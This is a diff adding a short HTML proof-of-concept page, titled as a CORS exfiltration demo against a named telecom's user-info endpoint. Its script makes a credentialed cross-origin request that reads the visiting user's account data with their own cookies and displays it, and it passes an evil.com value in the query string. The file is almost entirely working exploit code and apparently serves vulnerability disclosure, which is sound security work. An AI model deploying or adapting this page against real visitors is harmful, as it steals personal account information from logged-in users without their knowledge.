@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Optus CORS PoC</title>
+  </head>
+  <body>
+    <h2> Optus CORS Exfiltration PoC</h2>
+    <pre id="output">Loading...</pre>
+    <script>
+      fetch("https://app.optus.com.au/libs/cq/security/userinfo.json?link_click_id=https://evil.com", {
+        method: "GET",
+        credentials: "include"
+      })
+      .then(res => res.text())
+      .then(data => {
+        document.getElementById("output").innerText = data;
+      })
+      .catch(err => {
+        document.getElementById("output").innerText = "Error: " + err;
+      });
+    </script>
+  </body>
+</html>
